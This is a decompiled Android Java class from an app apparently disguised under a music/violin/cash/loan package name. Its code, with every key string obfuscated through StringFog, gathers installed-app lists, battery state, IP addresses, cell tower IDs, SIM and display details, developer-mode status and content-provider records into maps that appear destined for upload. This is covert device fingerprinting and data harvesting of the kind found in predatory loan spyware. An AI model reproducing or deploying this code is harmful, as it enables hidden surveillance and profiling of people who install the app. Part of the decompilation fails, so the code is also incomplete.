                    hashMap.put(StringFog.decrypt("3pfmGqUQ9HHSvsIcowk=\n", "t/mwc9Z5lh0=\n"), valueOf5);
                    hashMap.put(StringFog.decrypt("E/41jrc6wg==\n", "Y4xa6N5Wp6U=\n"), string4);
                    hashMap.put(StringFog.decrypt("lP0vLo1ycISD8zUvnw==\n", "95JBWuwRBNc=\n"), string5);
                    hashMap.put(StringFog.decrypt("2jczkPGvBFbNOSmR45gD\n", "uVhd5JDMcAU=\n"), valueOf6);
                    hashMap.put(StringFog.decrypt("DB5I4Q==\n", "Yn8lhPBiVLU=\n"), string6);
                    arrayList.add(hashMap);
                    contentResolver = contentResolver2;
                }
                string2 = "";
                hashMap.put(decrypt22, string2);
                hashMap.put(StringFog.decrypt("WNAe9c4ObP133gP1+wR1/VA=\n", "NLFtgZpnAZg=\n"), valueOf);
                hashMap.put(StringFog.decrypt("Ljyili2BlRI0OqmfGIev\n", "XVnM8nnuw30=\n"), valueOf2);
                hashMap.put(StringFog.decrypt("envIZJakWQ==\n", "CQ+pFuTBPRk=\n"), string3);
                hashMap.put(StringFog.decrypt("zVWIJcSG57DNXYY00qE=\n", "uTzlQLfFiN4=\n"), valueOf3);
                hashMap.put(StringFog.decrypt("cEQ68nMfqqRWUCTAfgI=\n", "GCVJohtwxME=\n"), valueOf4);
                hashMap.put(StringFog.decrypt("3pfmGqUQ9HHSvsIcowk=\n", "t/mwc9Z5lh0=\n"), valueOf5);
                hashMap.put(StringFog.decrypt("E/41jrc6wg==\n", "Y4xa6N5Wp6U=\n"), string4);
                hashMap.put(StringFog.decrypt("lP0vLo1ycISD8zUvnw==\n", "95JBWuwRBNc=\n"), string5);
                hashMap.put(StringFog.decrypt("2jczkPGvBFbNOSmR45gD\n", "uVhd5JDMcAU=\n"), valueOf6);
                hashMap.put(StringFog.decrypt("DB5I4Q==\n", "Yn8lhPBiVLU=\n"), string6);
                arrayList.add(hashMap);
                contentResolver = contentResolver2;
            }
            if (query != null && !query.isClosed()) {
                query.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return arrayList;
    }

    public static Map<String, Object> Tk3BGC4(Activity activity) {
        C4XY c4xy = new C4XY();
        try {
            String decrypt = StringFog.decrypt("cQFa4BA/kLd3EFU=\n", "FmQ0hWJe/PM=\n");
            C4XY c4xy2 = new C4XY();
            c4xy2.C4XY(StringFog.decrypt("vTiu8Cc=\n", "3FbKuUMlTD4=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.iFpfch2J8RfW1c(activity)).C4XY(StringFog.decrypt("YrfqOJYo3Mdwuvc=\n", "Et+FVvNmqao=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.vYxqgzJ193v1Yi(activity)).C4XY(StringFog.decrypt("Ad2wiO9IZRAU\n", "cbXf5oocHGA=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.NQtKsO(activity)).C4XY(StringFog.decrypt("EsrV\n", "f6S2qXjBKGQ=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.xoHs(activity)).C4XY(StringFog.decrypt("Mt5p\n", "X70KyCKBEaE=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.g6Zy(activity)).C4XY(StringFog.decrypt("6d53\n", "jbAEftEfnZ8=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.bswmnu()).C4XY(StringFog.decrypt("RO8dkbQO/7Y=\n", "KI5z9sFvmNM=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Sm73oGzmW(activity)).C4XY(StringFog.decrypt("ic4ECw==\n", "7q9tb8fke90=\n"), MyPlugin.C4XY(activity)).C4XY(StringFog.decrypt("UxSuJA==\n", "OnnLTaX5WcU=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.lm(activity)).C4XY(StringFog.decrypt("QaIaO2CQJWtfohwte408\n", "L8duTA/iTiQ=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.IQyLz(activity)).C4XY(StringFog.decrypt("LZLLhR1qcOo6h9o=\n", "Q/e/8nIYG74=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.bswmnu(activity)).C4XY(StringFog.decrypt("Ky6h44DobEU1Lqf1m/V1RCQmsA==\n", "RUvVlO+aBwo=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Cyxd6DRPreJUiX(activity)).C4XY(StringFog.decrypt("HiFoFPZUN4kjLA==\n", "akgFcaw7Wew=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.iFpfch2J8RfW1c()).C4XY(StringFog.decrypt("XlVS+xUhCCpdCX37FyM0OFVf\n", "MjoxmnlEQVk=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.X3OKRI(activity)).C4XY(StringFog.decrypt("FeIZeiNldMAK/RZ6NkxRxx74G3wq\n", "eY16G08AMKk=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.g6Zy()).C4XY(StringFog.decrypt("/3eYtX18wrX8K7i7ZHf/tOo=\n", "kxj71BEZi8Y=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.Tk3BGC4(activity)).C4XY(StringFog.decrypt("twu49A==\n", "3mbLnUwX8hg=\n"), com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.snRLW7bVlwmEpJ(activity));
            c4xy.C4XY(decrypt, c4xy2);
            c4xy.C4XY(StringFog.decrypt("gVKfB7DWpaGXUp8Gpg==\n", "4zPrc9Wk3PI=\n"), b6HMc6th(activity));
            c4xy.C4XY(StringFog.decrypt("ilEvp9zqNug=\n", "6SRd1YuDUIE=\n"), AFXu57tvOA0(activity));
            c4xy.C4XY(StringFog.decrypt("EQtAyjykUkcUDQ==\n", "cmQurFXDBS4=\n"), Cyxd6DRPreJUiX(activity));
            c4xy.C4XY(StringFog.decrypt("VTFcsVPZ2qg=\n", "PVAu1SS4qM0=\n"), RkflxGI2By7Sz(activity));
            String decrypt2 = StringFog.decrypt("wpTKAw1bEV8=\n", "rvupYnkyfjE=\n");
            C4XY c4xy3 = new C4XY();
            c4xy3.C4XY(StringFog.decrypt("GrNN\n", "fcM+Hw2lU/g=\n"), new C4XY());
            c4xy.C4XY(decrypt2, c4xy3);
            c4xy.C4XY(StringFog.decrypt("MQj/ltxIyrU=\n", "QX2d+rUrg8U=\n"), X3OKRI());
            c4xy.C4XY(StringFog.decrypt("CFQkBME0Lw==\n", "ez1JR6BGS4U=\n"), N4B1AfRo(activity));
            c4xy.C4XY(StringFog.decrypt("Rvbp2jOpxQ==\n", "NYKGqFLOoPE=\n"), lm(activity));
            c4xy.C4XY(StringFog.decrypt("mAMPxWxM02SW\n", "93dnoB4IshA=\n"), snRLW7bVlwmEpJ(activity));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return c4xy.C4XY();
    }

    private static C4XY X3OKRI() {
        C4XY c4xy = new C4XY();
        try {
            Iterator it = Collections.list(NetworkInterface.getNetworkInterfaces()).iterator();
            while (it.hasNext()) {
                Iterator it2 = Collections.list(((NetworkInterface) it.next()).getInetAddresses()).iterator();
                while (true) {
                    if (it2.hasNext()) {
                        InetAddress inetAddress = (InetAddress) it2.next();
                        if (!inetAddress.isLoopbackAddress() && !inetAddress.isLinkLocalAddress()) {
                            String decrypt = StringFog.decrypt("htqoQitbPaSmxA==\n", "77TcMEo1WNA=\n");
                            String hostAddress = inetAddress.getHostAddress();
                            if (hostAddress != null) {
                                if (TextUtils.isEmpty(hostAddress)) {
                                }
                                c4xy.C4XY(decrypt, hostAddress);
                            }
                            hostAddress = "";
                            c4xy.C4XY(decrypt, hostAddress);
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
        return c4xy;
    }

    public static List<Map> X3OKRI(Activity activity) {
        String decrypt;
        String str;
        String str2;
        ArrayList arrayList = new ArrayList();
        PackageManager packageManager = activity.getPackageManager();
        int i = Build.VERSION.SDK_INT;
        List<PackageInfo> installedPackages = packageManager.getInstalledPackages(8192);
        ArrayList arrayList2 = new ArrayList();
        for (int i2 = 0; i2 < installedPackages.size(); i2++) {
            C4XY c4xy = new C4XY();
            PackageInfo packageInfo = installedPackages.get(i2);
            arrayList2.add(packageInfo.packageName);
            String decrypt2 = StringFog.decrypt("UFYiIIn1Jw==\n", "MSZSbuiYQjw=\n");
            String charSequence = packageManager.getApplicationLabel(packageInfo.applicationInfo).toString();
            String str3 = "";
            if (charSequence == null || TextUtils.isEmpty(charSequence)) {
                charSequence = "";
            }
            c4xy.C4XY(decrypt2, charSequence);
            String decrypt3 = StringFog.decrypt("VZqd+dl3Gl1Elps=\n", "Jfv+krgQfxM=\n");
            String str4 = packageInfo.packageName;
            if (str4 == null || TextUtils.isEmpty(str4)) {
                str4 = "";
            }
            c4xy.C4XY(decrypt3, str4);
            c4xy.C4XY(StringFog.decrypt("3VunRfnktxTdWLE=\n", "tDXUMZiI20A=\n"), Long.valueOf(packageInfo.firstInstallTime));
            c4xy.C4XY(StringFog.decrypt("T3I2v9QrVR9XZw==\n", "OgJS3qBOAXY=\n"), Long.valueOf(packageInfo.lastUpdateTime));
            String decrypt4 = StringFog.decrypt("otHbWK+zaw==\n", "1LSpK8bcBVM=\n");
            String str5 = packageInfo.versionName;
            if (str5 != null && !TextUtils.isEmpty(str5)) {
                str3 = str5;
            }
            c4xy.C4XY(decrypt4, str3);
            c4xy.C4XY(StringFog.decrypt("xS9UIVoP+tDcLkM=\n", "s0omUjNglJM=\n"), Integer.valueOf(packageInfo.versionCode));
            c4xy.C4XY(StringFog.decrypt("vOkfoak=\n", "2oV+xto9IWM=\n"), Integer.valueOf(packageInfo.applicationInfo.flags));
            if ((packageInfo.applicationInfo.flags & 1) != 0) {
                decrypt = StringFog.decrypt("BcOXUOyQlw==\n", "ZLPnBJXg8mU=\n");
                str = "em3LCB9a\n";
                str2 = "KTSYXFoXrBk=\n";
            } else {
                decrypt = StringFog.decrypt("LpZf62MdGg==\n", "T+Yvvxptf+k=\n");
                str = "T4pjjymsvtpEiA==\n";
                str2 = "AcUt0Hr17Y4=\n";
            }
            c4xy.C4XY(decrypt, StringFog.decrypt(str, str2));
            arrayList.add(c4xy.C4XY());
        }
        return arrayList;
    }

    private static C4XY b6HMc6th(Activity activity) {
        boolean z;
        try {
            Intent registerReceiver = activity.registerReceiver(null, new IntentFilter(StringFog.decrypt("2puxA7juqe/Sm6EUufPjoNiBvB65qY+A76GQI47Yjon6u5I0kw==\n", "u/XVcdeHzcE=\n")));
            int intExtra = registerReceiver.getIntExtra(StringFog.decrypt("FkoST5Y=\n", "ei9kKvrvmAw=\n"), -1);
            int intExtra2 = registerReceiver.getIntExtra(StringFog.decrypt("Sk/8/ok=\n", "OSydkuyFkcw=\n"), -1);
            int intExtra3 = registerReceiver.getIntExtra(StringFog.decrypt("qhjnfdfF+A==\n", "2nSSGrCgnBo=\n"), -1);
            float f = intExtra / intExtra2;
            boolean z2 = false;
            boolean z3 = true;
            if (intExtra3 != 1) {
                if (intExtra3 != 2) {
                    z = false;
                } else {
                    z = true;
                    z2 = true;
                }
                z3 = false;
            } else {
                z = true;
            }
            C4XY c4xy = new C4XY();
            c4xy.C4XY(StringFog.decrypt("p9MofJanRN+mxg==\n", "xbJcCPPVPY8=\n"), Float.valueOf(f));
            c4xy.C4XY(StringFog.decrypt("9OK9wPEmzNDv9o0=\n", "nZHos5NlpLE=\n"), Boolean.valueOf(z2));
            c4xy.C4XY(StringFog.decrypt("SeXZWOZtechH8w==\n", "IJaYO6UFGLo=\n"), Boolean.valueOf(z3));
            c4xy.C4XY(StringFog.decrypt("Gwbdwmrvio8cEg==\n", "cnWeqgud7eY=\n"), Boolean.valueOf(z));
            return c4xy;
        } catch (Exception unused) {
            return new C4XY();
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x0074 A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0093 A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:25:0x00b5 A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:31:0x00df A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:37:0x010b A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0131 A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0155 A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:49:0x0156 A[Catch: Exception -> 0x0161, TryCatch #0 {Exception -> 0x0161, blocks: (B:3:0x0005, B:10:0x003f, B:16:0x007b, B:22:0x009a, B:28:0x00bc, B:34:0x00e6, B:40:0x0112, B:46:0x0138, B:53:0x015e, B:49:0x0156, B:43:0x0131, B:37:0x010b, B:31:0x00df, B:25:0x00b5, B:19:0x0093, B:13:0x0074, B:7:0x0038), top: B:56:0x0005 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    private static com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x.C4XY lm(android.app.Activity r6) {
        /*
            Method dump skipped, instructions count: 354
            To view this dump change 'Code comments level' option to 'DEBUG'
        */
        throw new UnsupportedOperationException("Method not decompiled: com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x.lm(android.app.Activity):com.music.violin.cash.violin.music.loan.store.cash.loan.QTcw4j1x$C4XY");
    }

    private static C4XY snRLW7bVlwmEpJ(Activity activity) {
        int i;
        List<CellInfo> allCellInfo;
        C4XY c4xy = new C4XY();
        List<String> N4B1AfRo = com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.N4B1AfRo(activity);
        boolean vYxqgzJ193v1Yi = com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.vYxqgzJ193v1Yi();
        boolean xoHs = com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.xoHs();
        c4xy.C4XY(StringFog.decrypt("zQ0+qx8khkg=\n", "pGBfzHpq8yU=\n"), Integer.valueOf(N4B1AfRo == null ? 0 : N4B1AfRo.size()));
        c4xy.C4XY(StringFog.decrypt("4c6JKkSB3Q==\n", "ia/6eCvuqeA=\n"), Boolean.valueOf(vYxqgzJ193v1Yi));
        c4xy.C4XY(StringFog.decrypt("NGw8KCII4Jo1\n", "RwVRXU5plPU=\n"), Boolean.valueOf(xoHs));
        c4xy.C4XY(StringFog.decrypt("NnvMOTsUR6Ayew==\n", "Vx+ufFV1Jcw=\n"), Boolean.valueOf(wXOhEqY(activity)));
        String decrypt = StringFog.decrypt("lIjSCDYNm50=\n", "/+2ralls6fk=\n");
        String oNyMDeoN9d7r = com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.oNyMDeoN9d7r(activity);
        String str = "";
        if (oNyMDeoN9d7r == null || TextUtils.isEmpty(oNyMDeoN9d7r)) {
            oNyMDeoN9d7r = "";
        }
        c4xy.C4XY(decrypt, oNyMDeoN9d7r);
        try {
            c4xy.C4XY(StringFog.decrypt("X//iPtfD+BZO\n", "PI+XcKKumnM=\n"), Integer.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.QTcw4j1x()));
            c4xy.C4XY(StringFog.decrypt("wfUzjSLAqLvN6jG5\n", "oIVDwEO45d4=\n"), Float.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.b6HMc6th()[0]));
            c4xy.C4XY(StringFog.decrypt("fPT/KXQatgl85uMNTx6yCm/9\n", "HYSPaAJ732U=\n"), Float.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.b6HMc6th()[1]));
            c4xy.C4XY(StringFog.decrypt("qdwBPI2XjLWtwR4Ihg==\n", "yKxxev/y6fg=\n"), Float.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.b6HMc6th()[2]));
            c4xy.C4XY(StringFog.decrypt("F/QOgKtCMe8XzxOMog==\n", "Y5t64ccAXoA=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.IQyLz()[0]));
            c4xy.C4XY(StringFog.decrypt("xaEQExHj83fFmg0fGPb9c9Q=\n", "sc5kcn2hnBg=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.IQyLz()[1]));
            c4xy.C4XY(StringFog.decrypt("Jd5OrFDfOdc6xg==\n", "SL827jGrTbI=\n"), Integer.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.C4XY(activity)[0]));
            c4xy.C4XY(StringFog.decrypt("09scfGukq8fL2xhg\n", "v75qGQfmyrM=\n"), Integer.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.C4XY(activity)[1]));
        } catch (Exception unused) {
        }
        try {
            HashMap hashMap = new HashMap();
            if (!(ActivityCompat.checkSelfPermission(activity, StringFog.decrypt("KmguliG5KqY7YziJJ6M94SRoZKUNkwvbGFkJqw+CHc0USgWnD4QHxwU=\n", "SwZK5E7QTog=\n")) != 0)) {
                TelephonyManager telephonyManager = (TelephonyManager) activity.getSystemService(StringFog.decrypt("1NFAdT4=\n", "pLkvG1u00AY=\n"));
                int i2 = -1;
                if (Build.VERSION.SDK_INT < 17 || (allCellInfo = telephonyManager.getAllCellInfo()) == null) {
                    i = -1;
                } else {
                    i = -1;
                    for (CellInfo cellInfo : allCellInfo) {
                        if (cellInfo instanceof CellInfoGsm) {
                            i2 = ((CellInfoGsm) cellInfo).getCellSignalStrength().getDbm();
                            i = ((CellInfoGsm) cellInfo).getCellIdentity().getCid();
                        } else if (cellInfo instanceof CellInfoCdma) {
                            i2 = ((CellInfoCdma) cellInfo).getCellSignalStrength().getDbm();
                            i = ((CellInfoCdma) cellInfo).getCellIdentity().getBasestationId();
                        } else if (cellInfo instanceof CellInfoWcdma) {
                            if (Build.VERSION.SDK_INT >= 18) {
                                i2 = ((CellInfoWcdma) cellInfo).getCellSignalStrength().getDbm();
                                i = ((CellInfoWcdma) cellInfo).getCellIdentity().getCid();
                            }
                        } else if (cellInfo instanceof CellInfoLte) {
                            i2 = ((CellInfoLte) cellInfo).getCellSignalStrength().getDbm();
                            i = ((CellInfoLte) cellInfo).getCellIdentity().getCi();
                        }
                    }
                }
                hashMap.put(StringFog.decrypt("sETw\n", "1CadXnM2MyM=\n"), Integer.valueOf(i2));
                hashMap.put(StringFog.decrypt("XWm2\n", "PgDSyOrJiAo=\n"), Integer.valueOf(i));
            }
            Object obj = hashMap.get(StringFog.decrypt("hN+b\n", "4L32GgCMfkY=\n"));
            if (obj != null) {
                String decrypt2 = StringFog.decrypt("sFRJ\n", "1DYkJhAVRF8=\n");
                String obj2 = obj.toString();
                if (obj2 != null && !TextUtils.isEmpty(obj2)) {
                    str = obj2;
                }
                c4xy.C4XY(decrypt2, str);
            }
        } catch (Exception unused2) {
        }
        c4xy.C4XY(StringFog.decrypt("Q4dm99PPZyR7j3jm\n", "L+YVg5GgCFA=\n"), Long.valueOf(com.music.violin.cash.violin.music.loan.store.cash.loan.C4XY.oNyMDeoN9d7r()));
        try {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            if (Build.VERSION.SDK_INT >= 30) {
                activity.getDisplay().getMetrics(displayMetrics);
            }
            int i3 = displayMetrics.heightPixels;
            c4xy.C4XY(StringFog.decrypt("hoNZTLZDWpmRlEM=\n", "9eArKdMtDfA=\n"), Integer.valueOf(displayMetrics.widthPixels));
            c4xy.C4XY(StringFog.decrypt("Oyi5wedmyO8hLKPQ\n", "SEvLpIIIgIo=\n"), Integer.valueOf(i3));
            c4xy.C4XY(StringFog.decrypt("bMJQUKAn/IRx0ktBvA==\n", "H6EiNcVJuOE=\n"), Float.valueOf(displayMetrics.density));
            c4xy.C4XY(StringFog.decrypt("6ZWN59YhZaX0hZb2ygtRqQ==\n", "mvb/grNPIcA=\n"), Integer.valueOf(displayMetrics.densityDpi));
        } catch (Exception unused3) {
        }
        return c4xy;
    }

    private static boolean wXOhEqY(Activity activity) {
        return Integer.valueOf(Build.VERSION.SDK).intValue() == 16 ? Settings.Secure.getInt(activity.getContentResolver(), StringFog.decrypt("CbdbYwWKNXIIvFlZGoAxawS8SnU2gCt+D75IYg==\n", "bdItBmnlRR8=\n"), 0) != 0 : Integer.valueOf(Build.VERSION.SDK).intValue() >= 17 && Settings.Secure.getInt(activity.getContentResolver(), StringFog.decrypt("GT2A4y5lhEcYNoLZMW+AXhQ2kfUdb5pLHzST4g==\n", "fVj2hkIK9Co=\n"), 0) != 0;
    }

    public String C4XY() {
        return this.Sm73oGzmW;
    }

    public String QTcw4j1x() {
        return this.QTcw4j1x;
    }

    public Method Sm73oGzmW() {
        return this.f507C4XY;
    }
}